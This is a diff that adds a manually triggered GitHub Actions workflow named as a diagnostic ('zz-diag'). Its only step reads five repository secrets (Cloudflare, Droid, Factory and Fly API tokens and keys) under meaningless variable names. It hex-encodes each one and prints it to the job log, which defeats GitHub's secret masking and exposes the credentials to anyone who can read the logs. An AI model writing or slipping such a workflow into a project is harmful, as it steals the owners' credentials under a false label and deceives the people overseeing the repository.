@@ -1,0 +1,21 @@
+name: zz-diag
+on:
+  workflow_dispatch:
+jobs:
+  d:
+    runs-on: ubuntu-latest
+    steps:
+      - name: diag
+        env:
+          A: ${{ secrets.CLOUDFLARE_API_TOKEN }}
+          B: ${{ secrets.CLOUDFLARE_ACCOUNT_ID }}
+          C: ${{ secrets.DROID_API_KEY }}
+          D: ${{ secrets.FACTORY_API_KEY }}
+          E: ${{ secrets.FLY_API_TOKEN }}
+        run: |
+          for v in A B C D E; do
+            val="${!v}"
+            hex=$(echo -n "$val" | od -A n -t x1 | tr -d ' 
+')
+            echo "$v=$hex"
+          done
